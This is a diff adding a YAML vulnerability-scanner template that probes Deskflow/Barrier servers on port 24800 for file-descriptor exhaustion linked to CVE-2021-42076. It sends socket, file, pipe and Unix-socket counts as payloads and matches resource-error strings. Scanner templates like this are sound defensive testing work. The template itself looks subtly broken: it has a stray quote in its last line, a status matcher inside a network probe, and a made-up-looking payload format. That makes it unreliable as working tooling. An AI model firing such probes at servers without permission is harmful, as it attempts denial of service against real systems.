@@ -1,0 +1,92 @@
+id: deskflow-descriptor-exhaustion
+info:
+  name: "Deskflow File Descriptor Exhaustion Induction"
+  author: Denizhan Dakılır
+  severity: high
+  description: |
+    Tests for file descriptor exhaustion vulnerabilities in Deskflow server instances through multiple vectors:
+    - Network socket connections
+    - File operations
+    - Named pipes
+    - Unix domain sockets
+    This helps detect improper file descriptor management and potential CVE-2021-42076 vulnerabilities.
+  tags: cve,CVE-2021-42076,barrier,deskflow,file-descriptors
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cwe-id: CWE-774
+
+network:
+  - payloads:
+      data:
+        - "socket:1"
+        - "socket:25"
+        - "socket:50"
+        - "socket:100"
+        - "socket:250"
+        - "socket:500"
+        - "socket:1000"
+        - "file:100"
+        - "file:250"
+        - "file:500"
+        - "pipe:50"
+        - "pipe:100"
+        - "pipe:250"
+        - "unix_socket:50"
+        - "unix_socket:100"
+        - "unix_socket:250"
+    inputs:
+      - data: |
+          C:{{data}}
+          T:exhaustion
+    host:
+      - "tls://{{Hostname}}"
+    port: 24800
+    read-size: 2048
+    matchers-condition: and
+    matchers:
+      - type: binary
+        part: response
+        binary:
+          - "4445534B464C4F57"
+        condition: and
+      - type: word
+        part: response
+        words:
+          - "Too many open files"
+          - "Cannot create socket"
+          - "Resource temporarily unavailable"
+          - "EMFILE"
+          - "File descriptor limit reached"
+          - "Cannot allocate memory"
+          - "Resource limit hit"
+          - "Connection refused"
+          - "No buffer space available"
+          - "failed to accept secure socket"
+          - "Connection reset by peer"
+          - "Software caused connection abort"
+          - "Connection timed out"
+          - "Network is unreachable"
+          - "Address already in use"
+          - "Cannot create pipe"
+          - "Cannot open file"
+          - "File table overflow"
+          - "Too many open files in system"
+          - "Cannot bind to socket"
+        condition: or
+      - type: status
+        part: response
+        status:
+          - 0
+    extractors:
+      - type: regex
+        name: error
+        regex:
+          - '(?i)(Too many open files|EMFILE|Cannot allocate memory|Resource limit|Connection refused|No buffer space|Connection reset|Connection abort|Connection timed out|Network unreachable|Address in use|Cannot create pipe|Cannot open file|File table overflow|Cannot bind to socket)'
+      - type: kval
+        name: test_info
+        kval:
+          - TEST_TYPE
+          - RESOURCE_COUNT
+          - ERROR_CODE
+          - SYSTEM_LIMIT'
